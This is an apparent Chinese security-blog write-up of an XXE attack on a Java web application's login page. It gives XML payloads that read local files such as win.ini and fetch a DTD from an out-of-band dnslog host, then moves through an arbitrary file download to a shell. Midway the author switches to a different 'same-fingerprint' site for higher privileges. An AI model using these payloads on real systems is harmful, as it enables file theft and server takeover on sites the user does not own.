#  Java实战篇-XXE漏洞利用从潜到深   
 进击安全   2024-03-09 16:02  
  
## 目标  
  
经典渗透场景   
- 登录框（授权合法渗透）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwiaeUbDrysJPicUZLk5jCzKbf06hGqmia9ibz7eeGXUiarvDhEse4ZJkqUTw/640?wx_fmt=png&from=appmsg "")  
## 初步挖掘  
  
发现某  
JSP路径返回包泄露了代码信息，且疑似存在XXE漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFw4gZHrhodhdG7aaKTD9fAX396UlND8Iic26xLJoCon1ZiafvnO1wGYf7g/640?wx_fmt=png&from=appmsg "")  
  
通过泄露的代码构造出  
post请求包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwfOEoQrzTRcvB8omwG6c3Ps88OCWgek3t62piaYg2Syibv69Hd5na3bHQ/640?wx_fmt=png&from=appmsg "")  
  
测试，漏洞存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwJxxxgxMuWRMq9lcuHUyJVSbsUwlRShkrkGecECiaQF4fqwK4khCorVw/640?wx_fmt=png&from=appmsg "")  
  
Poc：  
<table><tbody><tr><td width="426" valign="top" style="padding: 0pt 5.4pt;border-width: 1pt;border-color: windowtext;"><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE ANY [</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">&lt;!ENTITY % file SYSTEM &#34;file:///C:\Windows\win.ini&#34;&gt;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">&lt;!ENTITY % dtd SYSTEM &#34;http://xxe.</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">xxx</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">.</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">dnslog</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">.</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">cn</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">/xxe&#34;&gt;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">%dtd;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">%send;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">]&gt;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">&lt;root&gt;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">&lt;name&gt;&amp;b;&lt;/name&gt;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">&lt;/root&gt;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
**插曲 - XXE复习**  
  
**参考文章：******  
  
https://forum.butian.net/share/2573  
  
https://www.heetian.com/info/565  
  
XXE漏洞指的是**XML外部实体注入**  
（  
XML External Entity Injection）漏洞，它是一种常见的安全漏洞类型，可以用来攻击基于XML的应用程序。当应用程序接受XML输入时，攻击者可以插入带有外部实体引用的恶意XML数据，从而导致应用程序执行未经授权的操作，比如访问本地文件系统、执行远程代码等。攻击者可以通过利用XXE漏洞来获取敏感信息、控制服务器，或者执行其他恶意操作  
  
**读取文件******  
  
在进行利用之前应该先测试下，目标环境有无**回显**，是否**支持外部实体**。  
<table><tbody><tr><td width="426" valign="top" style="padding: 0pt 5.4pt;border-width: 1pt;border-color: windowtext;"><p style="margin-top:12.0000pt;margin-bottom:8.0000pt;mso-pagination:widow-orphan;line-height:150%;"><span style="font-family: 宋体;line-height: 150%;color: rgb(36, 41, 47);letter-spacing: 0pt;font-size: 12pt;background: rgb(255, 255, 255);"><span style="font-family:宋体;">检查是否支持外部实体</span></span><span style="font-family: 宋体;line-height: 150%;color: rgb(36, 41, 47);letter-spacing: 0pt;font-size: 12pt;background: rgb(255, 255, 255);"><o:p></o:p></span></p><p style="margin-top:12.0000pt;margin-bottom:8.0000pt;mso-pagination:widow-orphan;line-height:150%;"><span style="font-family: 宋体;line-height: 150%;color: rgb(36, 41, 47);letter-spacing: 0pt;font-size: 12pt;background: rgb(255, 255, 255);"><span style="font-family:宋体;">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span></span><span style="font-family: 宋体;line-height: 150%;color: rgb(36, 41, 47);letter-spacing: 0pt;font-size: 12pt;background: rgb(255, 255, 255);"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"> </span></p><p style="margin-top:12.0000pt;margin-bottom:8.0000pt;mso-pagination:widow-orphan;line-height:150%;"><span style="font-family: 宋体;line-height: 150%;color: rgb(36, 41, 47);letter-spacing: 0pt;font-size: 12pt;background: rgb(255, 255, 255);"><span style="font-family:宋体;">%foo;</span></span><span style="font-family: 宋体;line-height: 150%;color: rgb(36, 41, 47);letter-spacing: 0pt;font-size: 12pt;background: rgb(255, 255, 255);"><o:p></o:p></span></p><p style="margin-top:12.0000pt;margin-bottom:8.0000pt;mso-pagination:widow-orphan;line-height:150%;"><span style="font-family: 宋体;line-height: 150%;color: rgb(36, 41, 47);letter-spacing: 0pt;font-size: 12pt;background: rgb(255, 255, 255);"><span style="font-family:宋体;">]&gt;</span></span><span style="font-family: 宋体;line-height: 150%;color: rgb(36, 41, 47);letter-spacing: 0pt;font-size: 12pt;background: rgb(255, 255, 255);"><o:p></o:p></span></p><p style="margin-top:12.0000pt;margin-bottom:8.0000pt;mso-pagination:widow-orphan;line-height:150%;"><span style="font-family: 宋体;line-height: 150%;color: rgb(36, 41, 47);letter-spacing: 0pt;font-size: 12pt;background: rgb(255, 255, 255);"><span style="font-family:宋体;">查看你的服务器是否有请求</span></span><span style="font-family: 宋体;line-height: 150%;color: rgb(36, 41, 47);letter-spacing: 0pt;font-size: 12pt;background: rgb(255, 255, 255);"><o:p></o:p></span></p></td></tr></tbody></table>  
**不同平台支持的协议******  
  
注意：  
jdk1.8开始不再支持gopher协议  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwtLicRCNPkF6Rx8bkys67ibeuzoF4ibIh56xh7PMg8xcJBWicSHLEA3rq2g/640?wx_fmt=png&from=appmsg "")  
  
**Java环境下读取文件******  
  
1、netdoc协议和file协议的作用是一样的，都可以读取文件  
  
2、Java环境下可以使用file协议读取列目录，和ls作用类似  
  
3、在Java环境中，我们可以使用CDATA来读取包含特殊字符的文本数据，避免XML解析器对其进行解析。但是也只能读取一些简单的文本文件，如果文本中含有&或%还是无法进行读取。  
  
如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwDohk88wGtYPceIqfTESyPKLONaXgdab0wXmLQ5tKg6PWXKfWrzZBOg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwPUKia75Tg8IrdZI9cTm4ibWibIy6QvibMWgg6lbVEHZn79Z8yFrQLAicQ5A/640?wx_fmt=png&from=appmsg "")  
## 深入挖掘  
  
至此，脑中已有大体思路，那就是利用  
XXE外带或者回显读文件来进一步扩大攻击面；由于Java下用  
file和CDATA也无法读取内容含&、%、中文等文件，所以不能读jsp，class等文件，可以选择读向日葵，web.xml等文件来尝试getshell。****  
  
**报错找绝对路径******  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwVia9JJN8icz99CVfCuS6O8vKzMoXE8RMwtbTOkEK2qfgUmLPQ9qrVWCg/640?wx_fmt=png&from=appmsg "")  
  
<table><tbody><tr><td width="426" valign="top" style="padding: 0pt 5.4pt;border-width: 1pt;border-color: windowtext;"><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">&lt;?xml version=&#34;1.0&#34;?&gt;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">&lt;!DOCTYPE foo [</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">    <span style="font-family:宋体;">&lt;!ELEMENT foo ANY&gt;</span></span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">    <span style="font-family:宋体;">&lt;!ENTITY xxe SYSTEM &#34;file&#34;&gt;</span></span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">]&gt;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">&lt;service&gt;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">    <span style="font-family:宋体;">&lt;serviceID&gt;&amp;xxe;&lt;/serviceID&gt;</span></span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">    <span style="font-family:宋体;">&lt;parameters&gt;</span></span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">        <span style="font-family:宋体;">&lt;parameter index=&#34;&#34; type=&#34;&#34;&gt;&lt;/parameter&gt;</span></span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">    <span style="font-family:宋体;">&lt;/parameters&gt;</span></span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p><p style="line-height:150%;"><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;">&lt;/service&gt;</span><span style="font-family:宋体;line-height:150%;font-size:12.0000pt;mso-font-kerning:1.0000pt;"><o:p></o:p></span></p></td></tr></tbody></table>  
**列目录、读文件******  
  
利用本地  
DTD进行文件读取  
时发现权限不够，被拒绝访问了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwVRtSaUClRqLQ6hmiarvY9LqyQUEZGz9HGRkRqia5466byBwMahJuk6NQ/640?wx_fmt=png&from=appmsg "")  
  
小问题，这可难不倒我胡图图，寻找同指纹站点，找个权限高的，便可解决问题  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwtA6COIzhwQPwEMkA9rgF3gmAKgzkICABDicLnYBOMERNbVQFOKAwocg/640?wx_fmt=png&from=appmsg "")  
  
更换站点后，顺利读取目标  
web目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwpgrgmGYibia0t6u0k3dPR09s1bUZSIbAXhRfu76QtMt0LjBfvnDqvxpg/640?wx_fmt=png&from=appmsg "")  
  
通过读  
web.xml+黑盒测试，发现任意下载漏洞  
  
web.xml中存在未授权的文件操作接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwdvSl511Ytic0E3CgibDC9Tjgc1zGsibFz9wFrDmpibCkFGdlsyQ6N5VfmA/640?wx_fmt=png&from=appmsg "")  
  
黑盒，存在任意文件下载漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwIWiaDKzicgFtSd32rgpZH1OZcC2CiaAyOUbEaT3MoSpicGGgumtZ8KVicnw/640?wx_fmt=png&from=appmsg "")  
  
有了任意下载，接下来的渗透之路譬如探朗取物般简单，通过任意下载，将  
class文件下载到本地进行阅读  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwQo3dBgPKWpiaLiaEwfhS5L6msBlthMpxLcAjc9nQCyYHNQlg44Ug698w/640?wx_fmt=png&from=appmsg "")  
  
成功  
getshell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibyhXPNOCerMsjfaqC27gNJZEQKjichbFwcgyF0iclWoN0Cibrae2BSTsOBIiaKS1dhOM6ibDm1l41EX9Ile1pibW5geQ/640?wx_fmt=png&from=appmsg "")  
  
最终完成曲折的日站之旅  
## 总结  
  
平常看了些许  
XXE漏洞利用文章，等到自己实际上手时还是很抓瞎  
  
千学不如一看，千看不如一练  
  
**本公众号作者联系方式**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZRKuxIKRyhXhuxbCGecu4ibia3kSXD8ePQHrSvPSNtC7PmjzQwR88Hu0LpuXdQzamKBCPAXX82anLS8f0FF3LzzQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
